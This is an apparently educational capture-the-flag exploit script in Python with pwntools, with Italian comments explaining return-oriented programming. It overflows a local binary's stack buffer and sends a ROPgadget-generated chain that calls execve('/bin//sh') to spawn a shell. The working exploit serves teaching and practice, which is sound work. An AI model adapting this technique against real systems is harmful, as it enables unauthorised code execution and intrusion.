#!/bin/python3
from pwn import *

p = process("./chall_14")

#Input non vulnerabile
p.sendline()

#Un altro modo per trovare l'offset ma direttamente durante la programmazione dell'exploit
padding = cyclic_find(0x616161616161616E,n=8) # 123 = cyclic -n 8 -l 0x616161616161616E

"""
Da ghidra notiamo subito alcune cose:
1. Il programma è compilato staticamente

Vul dire che tutte le funzioni che sono presenti in librerie esterne sono ora all'interno
del binario

2. Il programma non contiene una funzione win

Quindi non potremo semplicemente chiamare una funzione per avviare la shell
ma dovremo trovare il modo per eseguire il codice che faccia questo


Considerazioni:
- Il programma ha PIE disattivato
- NX è attivo quindi non possiamo eseguire codice sullo stack

Soluzione?

ROP = Return Oriented Programming
Inventiamo un nuovo modo di programmare

Definizioni:
- Gadget
    Breve segmento di istruzioni (Assembly con di solito con un ret finale) già presenti nel binario
- ROP chain
    Catena di gadget

Come funziona il ROP:
Prendendo diversi gadget, possiamo comporre del codice a nostra discrezione per Eseguire codice macchina arbitrario (Arbitrary Code Execution)

Come facciamo eseguire i gadget?
Grazie a una qualsiasi vulnerabilità per la scrittura della memoria sullo stack (solitamente con buffer overflow)
possiamo sovrascrivere l'indirizzo di ritorno della funzione con l'indirizzo del primo gadget
a seguito scriviamo gli altri indirizzi/dati

0xaaaa #Gadget 1: add rax,23; ret;
0xbbbb #Gadget 2: sub rbx,67; ret;
Ecc...

In questo modo Il programma ad ogni return salterà all'indirizzo del gadget successivo fino ad arrivare all'ultimo Gadget


Obiettivo: Creare una ROP chain per aprire una shell
Come Farlo?
Ci sono dei tool come:
- Ropper https://github.com/sashs/Ropper
- ROPgadget https://github.com/JonathanSalwan/ROPgadget
che ci aiutano in molte operazioni

Ad esempio per ricercare i gadget possiamo:
1. Leggere il codice assembly ed annotare gli indirizzi dei gadget :|
2. Utilizzare ropper o ROPgadget che trovano i gadget per noi :)

Una volta trovati i gadget che ci possono essere utili possiamo:
1. Cerchiamo la/le syscall che serve chiamare https://chromium.googlesource.com/chromiumos/docs/+/master/constants/syscalls.md
e combiniamo i vari gadget tra loro per eseguire queste chiamate corretamente (Utile in caso ci siano pochi gadget)
2. Facciamo generare a ROPgadget in automatico una composizione di gadget per eseguire una shell!

Aquisite queste informazioni scriviamo l'exploit

"""

#ROP gadget ROPgadget --binary ./chall_14 --ropchain
def rop_chain():
        # execve generated by ROPgadget
        from struct import pack
        # Padding goes here
        pl = b''
        pl += pack('<Q', 0x0000000000410263) # pop rsi ; ret
        pl += pack('<Q', 0x00000000006b90e0) # @ .data
        pl += pack('<Q', 0x00000000004158f4) # pop rax ; ret
        pl += b'/bin//sh'
        pl += pack('<Q', 0x000000000047f401) # mov qword ptr [rsi], rax ; ret
        pl += pack('<Q', 0x0000000000410263) # pop rsi ; ret
        pl += pack('<Q', 0x00000000006b90e8) # @ .data + 8
        pl += pack('<Q', 0x0000000000444e50) # xor rax, rax ; ret
        pl += pack('<Q', 0x000000000047f401) # mov qword ptr [rsi], rax ; ret
        pl += pack('<Q', 0x0000000000400696) # pop rdi ; ret
        pl += pack('<Q', 0x00000000006b90e0) # @ .data
        pl += pack('<Q', 0x0000000000410263) # pop rsi ; ret
        pl += pack('<Q', 0x00000000006b90e8) # @ .data + 8
        pl += pack('<Q', 0x0000000000449b15) # pop rdx ; ret
        pl += pack('<Q', 0x00000000006b90e8) # @ .data + 8
        pl += pack('<Q', 0x0000000000444e50) # xor rax, rax ; ret
        for _ in range(59):
            pl += pack('<Q', 0x0000000000474890) # add rax, 1 ; ret
        pl += pack('<Q', 0x000000000040120c) # syscall
        return pl

payload = b"A"*padding + rop_chain()

p.sendline(payload)

p.interactive()